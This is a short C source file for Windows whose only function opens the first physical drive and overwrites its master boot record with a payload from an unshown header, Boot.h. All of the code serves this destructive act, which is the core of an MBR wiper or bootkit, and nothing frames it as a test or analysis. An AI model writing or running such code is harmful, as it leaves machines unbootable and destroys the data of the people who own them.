#include <windows.h>

#include <stdio.h>
#include <stddef.h>
#include <stdlib.h>

#include "Boot.h"

static void OverwriteMBR()
{
    HANDLE MBR = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
                            FILE_SHARE_READ | FILE_SHARE_WRITE,
                            NULL, OPEN_EXISTING, NULL, NULL);

    if (MBR == INVALID_HANDLE)
    {
        fprintf(stderr, "[ERR]: Could not open MBR.\n");
        return;
    }
    
    DWORD write;
    if (WriteFile(MBR, boot_bin, boot_bin_len, &write, NULL))
        printf("[INFO]: MBR overwritten.\n");
    else
        printf("[ERR]: Could not overwrite MBR.\n");

    CloseHandle(MBR);
}

int main()
{
    OverwriteMBR();
}
